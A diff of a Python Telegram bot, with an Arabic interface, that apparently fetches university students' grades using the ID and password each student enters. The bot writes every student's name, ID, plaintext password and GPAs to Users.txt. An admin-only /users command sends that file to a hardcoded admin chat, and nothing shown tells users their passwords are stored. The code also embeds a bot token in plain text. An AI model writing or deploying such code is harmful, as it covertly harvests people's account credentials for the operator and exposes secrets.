@@ -4,6 +4,8 @@ import requests
 from bs4 import BeautifulSoup
 import json
 from urllib.parse import quote
+import time
+import threading
 
 admin_chat_id = 1792449471
 token = "6410467729:AAHQRfTnP2-yR1V1DGDZo6UZxlTzuac-upk"
@@ -26,11 +28,12 @@ change_pass = types.InlineKeyboardButton(text='تغيير الباسورد🔑',
 keyboard.row(natega, pas)
 keyboard.row(change_pass)
 keyboard.row(dev, grop)
+
 #ارسال users للادمن
 @bot.message_handler(commands=['users'])
 def users_command(message):
     if str(message.chat.id) == str(admin_chat_id):
-        with open('data.txt', 'rb') as file:
+        with open('Users.txt', 'rb') as file:
             bot.send_document(admin_chat_id, file)
     else:
         bot.reply_to(message, 'ليس لديك صلاحية الوصول لهذا الأمر.')
@@ -233,8 +236,8 @@ def process_password(message, student_id):
     json_text = soup.get_text()
     data2 = json.loads(json_text)
     name=data2["stuName"]
-    with open('data.txt', 'a') as file:
-    	file.write(f"\n{'-' * 50}\nName: {name}\nID: {student_id}\nPassword: {password}")
+    with open('Users.txt', 'a') as file:
+    	file.write(f"\nName: {name}\nID: {student_id}\nPassword: {password}\n{'-' * 50}\n")
     	calculate_and_send_course_inf(chat_id, data2, name, student_id, password, message)
     	calculate_and_send_course_info(chat_id, data2)
 
@@ -244,7 +247,7 @@ def calculate_and_send_course_info(chat_id, data2):
         first_semester_2022_2023 = data2["StuSemesterData"][0]["Semesters"][0]
         total_credits_2022_2023, message_2022_2023 = print_course_info(first_semester_2022_2023["Courses"], "اولي ترم اول")
         bot.send_message(chat_id, f"{message_2022_2023}\nالساعات المسجلة: {first_semester_2022_2023['RegHrs']}        الساعات الحاصل عليها: {first_semester_2022_2023['CurrCH']}\nالمعدل الفصلي: {first_semester_2022_2023['GPA']}        المعدل التراكمي: {first_semester_2022_2023['CurrGPA']}", parse_mode='Markdown')
-        with open('data.txt', 'a') as file:
+        with open('Users.txt', 'a') as file:
         	file.write(f"\nالمعدل الفصلي: {first_semester_2022_2023['GPA']}        المعدل التراكمي: {first_semester_2022_2023['CurrGPA']}")
     except Exception as e:
         print(f"حدث خطأ في الدورة الأولى (2022-2023): {e}")
@@ -255,7 +258,7 @@ def calculate_and_send_course_info(chat_id, data2):
         total_credits_2022_2023 += print_course_info(second_semester_2022_2023["Courses"], "اولي ترم تاني (2022-2023)")[0]
         message_2022_20232 = "\n\n" + print_course_info(second_semester_2022_2023["Courses"], "اولي ترم تاني")[1]
         bot.send_message(chat_id, f"{message_2022_20232}\nالساعات المسجلة: {second_semester_2022_2023['RegHrs']}        الساعات الحاصل عليها: {second_semester_2022_2023['CurrCH']}\nالمعدل الفصلي: {second_semester_2022_2023['GPA']}        المعدل التراكمي: {second_semester_2022_2023['CurrGPA']}", parse_mode='Markdown')
-        with open('data.txt', 'a') as file:
+        with open('Users.txt', 'a') as file:
         	file.write(f"\nالمعدل الفصلي: {second_semester_2022_2023['GPA']}        المعدل التراكمي: {second_semester_2022_2023['CurrGPA']}")
     except Exception as e:
         print(f"حدث خطأ في الدورة الثانية (2022-2023): {e}")
@@ -265,7 +268,7 @@ def calculate_and_send_course_info(chat_id, data2):
         first_semester_2023_2024 = data2["StuSemesterData"][1]["Semesters"][0]
         total_credits_2023_2024, message_2023_2024 = print_course_info(first_semester_2023_2024["Courses"], "تانية ترم اول")
         bot.send_message(chat_id, f"{message_2023_2024}\nالساعات المسجلة: {first_semester_2023_2024['RegHrs']}        الساعات الحاصل عليها: {first_semester_2023_2024['CurrCH']}\nالمعدل الفصلي: {first_semester_2023_2024['GPA']}        المعدل التراكمي: {first_semester_2023_2024['CurrGPA']}", parse_mode='Markdown')
-        with open('data.txt', 'a') as file:
+        with open('Users.txt', 'a') as file:
         	file.write(f"\nالمعدل الفصلي: {first_semester_2023_2024['GPA']}        المعدل التراكمي: {first_semester_2023_2024['CurrGPA']}")
     except Exception as e:
         print(f"حدث خطأ في الدورة الأولى (2023-2024): {e}")
@@ -274,7 +277,7 @@ def calculate_and_send_course_info(chat_id, data2):
         first_semester_2023_2024 = data2["StuSemesterData"][1]["Semesters"][1]
         total_credits_2023_2024, message_2023_2024 = print_course_info(first_semester_2023_2024["Courses"], "تانية ترم تاني")
         bot.send_message(chat_id, f"{message_2023_2024}\nالساعات المسجلة: {first_semester_2023_2024['RegHrs']}        الساعات الحاصل عليها: {first_semester_2023_2024['CurrCH']}\nالمعدل الفصلي: {first_semester_2023_2024['GPA']}        المعدل التراكمي: {first_semester_2023_2024['CurrGPA']}", parse_mode='Markdown')
-        with open('data.txt', 'a') as file:
+        with open('Users.txt', 'a') as file:
         	file.write(f"\nالمعدل الفصلي: {first_semester_2023_2024['GPA']}        المعدل التراكمي: {first_semester_2023_2024['CurrGPA']}")
     except Exception as e:
         print(f"حدث خطأ في الدورة الأولى (2023-2024): {e}")
@@ -283,7 +286,7 @@ def calculate_and_send_course_info(chat_id, data2):
         first_semester_2023_2024 = data2["StuSemesterData"][2]["Semesters"][0]
         total_credits_2023_2024, message_2023_2024 = print_course_info(first_semester_2023_2024["Courses"], "تالتة ترم اول")
         bot.send_message(chat_id, f"{message_2023_2024}\nالساعات المسجلة: {first_semester_2023_2024['RegHrs']}        الساعات الحاصل عليها: {first_semester_2023_2024['CurrCH']}\nالمعدل الفصلي: {first_semester_2023_2024['GPA']}        المعدل التراكمي: {first_semester_2023_2024['CurrGPA']}", parse_mode='Markdown')
-        with open('data.txt', 'a') as file:
+        with open('Users.txt', 'a') as file:
         	file.write(f"\nالمعدل الفصلي: {first_semester_2023_2024['GPA']}        المعدل التراكمي: {first_semester_2023_2024['CurrGPA']}")
     except Exception as e:
         print(f"حدث خطأ في الدورة الأولى (2023-2024): {e}")
@@ -292,7 +295,7 @@ def calculate_and_send_course_info(chat_id, data2):
         first_semester_2023_2024 = data2["StuSemesterData"][2]["Semesters"][1]
         total_credits_2023_2024, message_2023_2024 = print_course_info(first_semester_2023_2024["Courses"], "تالتة ترم تاني")
         bot.send_message(chat_id, f"{message_2023_2024}\nالساعات المسجلة: {first_semester_2023_2024['RegHrs']}        الساعات الحاصل عليها: {first_semester_2023_2024['CurrCH']}\nالمعدل الفصلي: {first_semester_2023_2024['GPA']}        المعدل التراكمي: {first_semester_2023_2024['CurrGPA']}", parse_mode='Markdown')
-        with open('data.txt', 'a') as file:
+        with open('Users.txt', 'a') as file:
         	file.write(f"\nالمعدل الفصلي: {first_semester_2023_2024['GPA']}        المعدل التراكمي: {first_semester_2023_2024['CurrGPA']}")
     except Exception as e:
         print(f"حدث خطأ في الدورة الأولى (2023-2024): {e}")
@@ -301,7 +304,7 @@ def calculate_and_send_course_info(chat_id, data2):
         first_semester_2023_2024 = data2["StuSemesterData"][3]["Semesters"][0]
         total_credits_2023_2024, message_2023_2024 = print_course_info(first_semester_2023_2024["Courses"], "رابعة ترم اول")
         bot.send_message(chat_id, f"{message_2023_2024}\nالساعات المسجلة: {first_semester_2023_2024['RegHrs']}        الساعات الحاصل عليها: {first_semester_2023_2024['CurrCH']}\nالمعدل الفصلي: {first_semester_2023_2024['GPA']}        المعدل التراكمي: {first_semester_2023_2024['CurrGPA']}", parse_mode='Markdown')
-        with open('data.txt', 'a') as file:
+        with open('Users.txt', 'a') as file:
         	file.write(f"\nالمعدل الفصلي: {first_semester_2023_2024['GPA']}        المعدل التراكمي: {first_semester_2023_2024['CurrGPA']}")
 
 
@@ -312,7 +315,7 @@ def calculate_and_send_course_info(chat_id, data2):
         first_semester_2023_2024 = data2["StuSemesterData"][3]["Semesters"][1]
         total_credits_2023_2024, message_2023_2024 = print_course_info(first_semester_2023_2024["Courses"], "رابعة ترم تاني")
         bot.send_message(chat_id, f"{message_2023_2024}\nالساعات المسجلة: {first_semester_2023_2024['RegHrs']}        الساعات الحاصل عليها: {first_semester_2023_2024['CurrCH']}\nالمعدل الفصلي: {first_semester_2023_2024['GPA']}        المعدل التراكمي: {first_semester_2023_2024['CurrGPA']}", parse_mode='Markdown')
-        with open('data.txt', 'a') as file:
+        with open('Users.txt', 'a') as file:
         	file.write(f"\nالمعدل الفصلي: {first_semester_2023_2024['GPA']}        المعدل التراكمي: {first_semester_2023_2024['CurrGPA']}")
 
 
